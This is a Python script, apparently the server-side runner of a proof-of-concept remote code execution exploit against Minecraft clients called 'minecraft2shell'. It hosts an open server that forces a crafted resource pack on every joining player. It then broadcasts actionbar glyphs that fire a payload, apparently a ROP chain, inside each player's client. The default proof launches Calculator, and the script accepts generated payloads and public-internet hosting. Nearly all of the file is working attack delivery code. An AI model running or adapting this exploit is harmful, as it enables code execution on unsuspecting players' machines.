"""minecraft2shell server-only runner.

Everything poc.py does on the server side, without launching the stock
client: official dependencies, local server, resource pack over HTTP, and
the fixed F/A actionbar broadcast to EVERY player online.  The payload fires
inside each player's client process, so nothing is expected on this machine
unless a player runs locally (--watch-calc).

The server accepts any player (online-mode=false, no whitelist) and forces
the pack on everyone (require-resource-pack=true).
"""
import argparse
import hashlib
import json
import subprocess
import sys
import threading
import time
import uuid
from pathlib import Path

import poc
from bootstrap import prepare_dependencies


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="minecraft2shell server-only: any player who joins gets the pack and the glyphs")
    parser.add_argument("--pack", default=None,
                        help="resource pack zip (default: resource-pack-cmd.zip if present, else resource-pack.zip)")
    parser.add_argument("--rounds", type=int, default=3,
                        help="F/A broadcast rounds; 0 loops until Ctrl+C (default: 3)")
    parser.add_argument("--max-players", type=int, default=20,
                        help="server slot count (default: 20)")
    parser.add_argument("--host", default=None,
                        help="address put into the resource-pack URL (default: auto-detected LAN IP); "
                             "set your public IP or domain when players connect over the internet")
    parser.add_argument("--watch-calc", action="store_true",
                        help="also watch THIS machine for a new Calculator (local test players)")
    opts = parser.parse_args(argv)

    if sys.platform != "win32":
        raise RuntimeError("This proof requires Windows x64")
    pack = poc.choose_pack(opts.pack)
    pack_sha1 = hashlib.sha1(pack.read_bytes()).hexdigest().upper()
    if pack_sha1 != poc.DOCUMENTED_SHA1:
        print(f"NOTE pack sha1 {pack_sha1} differs from the documented "
              f"{poc.DOCUMENTED_SHA1} (expected for a generated payload)", flush=True)
    print(f"PACK {pack.name} sha1={pack_sha1}", flush=True)
    print("PACK_LAYOUT points=104 vector_bytes=832 (0x340) sweep=128 (0x80)", flush=True)
    print("VM_LAYOUT stack_cells=12288 stack_bytes=49152 (0xC000) chain_offset=28672 (0x7000)",
          flush=True)
    poc.require_free_ports((poc.SERVER_PORT, poc.HTTP_PORT, poc.RCON_PORT))
    manifest = prepare_dependencies(poc.ROOT)
    for key in ("server_runtime_jar", "server_launch_mode", "java_path"):
        if not manifest.get(key):
            raise RuntimeError(f"Dependency bootstrap did not provide {key}")
    if manifest["server_launch_mode"] != "jar":
        raise RuntimeError("This PoC requires an official server JAR")

    run_dir = poc.ROOT / "runs" / ("server-" + time.strftime("%Y%m%d-%H%M%S")
                                   + "-" + uuid.uuid4().hex[:8])
    server_dir = run_dir / "server"
    server_dir.mkdir(parents=True)
    rcon_password = uuid.uuid4().hex
    host = opts.host or poc.advertise_ip()
    pack_url = f"http://{host}:{poc.HTTP_PORT}/resource-pack.zip"
    poc.write_server_files(server_dir, rcon_password, pack_url, pack_sha1,
                           max_players=opts.max_players)

    watch = opts.watch_calc
    baseline = poc.calculator_processes() if watch else None
    observed = set()
    served_event = threading.Event()
    http_server = None
    game_server = None
    handles = []
    result = {"success": False, "calculator_pids": [], "calculator_window_visible": False,
              "pack": str(pack), "pack_sha1": pack_sha1, "run_dir": str(run_dir)}
    try:
        http_server, _ = poc.make_pack_server(served_event, pack)
        server_out = (run_dir / "server.stdout.log").open("w", encoding="utf-8")
        server_err = (run_dir / "server.stderr.log").open("w", encoding="utf-8")
        handles.extend((server_out, server_err))
        server_args = [str(manifest["java_path"]), "-Xms256M", "-Xmx1G",
                       "-jar", str(manifest["server_runtime_jar"]), "nogui"]
        game_server = subprocess.Popen(server_args, cwd=server_dir, stdout=server_out,
                                       stderr=server_err,
                                       creationflags=subprocess.CREATE_NO_WINDOW)
        poc.wait_for("server startup",
                     lambda: poc.text_contains(run_dir / "server.stdout.log", "Done ("),
                     180, (game_server,))
        players = poc.wait_for_players(rcon_password, 600, (game_server,))
        if not players:
            raise TimeoutError("no player joined the server")
        print(f"PLAYERS_ONLINE {', '.join(players)}", flush=True)
        print(f"PACK_URL {pack_url}", flush=True)
        print(f"QUIET_BEFORE_F={poc.QUIET_SECONDS} seconds", flush=True)
        time.sleep(poc.QUIET_SECONDS)
        fired_round = poc.broadcast_rounds(rcon_password, run_dir, opts.rounds or 2 ** 30,
                                           baseline if watch else None, observed)
        result["success"] = True
        result["calculator_pids"] = sorted(observed)
        result["calculator_window_visible"] = bool(poc.visible_calculator_window(observed))
        result["rounds_completed"] = fired_round if fired_round is not None else "loop"
        if observed:
            print(f"POC_SUCCESS Calculator PID(s): {', '.join(map(str, sorted(observed)))}",
                  flush=True)
        else:
            print("POC_COMPLETED broadcast finished; the payload fires on players' machines",
                  flush=True)
    except KeyboardInterrupt:
        result["error"] = "interrupted by user"
        print("POC_INTERRUPTED (Ctrl+C)", flush=True)
    except Exception as error:
        result["error"] = str(error)
        print(f"POC_FAILURE {error}", flush=True)
    finally:
        poc.stop_owned(game_server)
        if http_server is not None:
            http_server.shutdown()
            http_server.server_close()
        for handle in handles:
            handle.close()
        (run_dir / "result.json").write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
        print(f"RESULT_FILE={run_dir / 'result.json'}", flush=True)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as error:
        print(f"POC_FAILURE {error}", file=sys.stderr, flush=True)
        sys.exit(1)
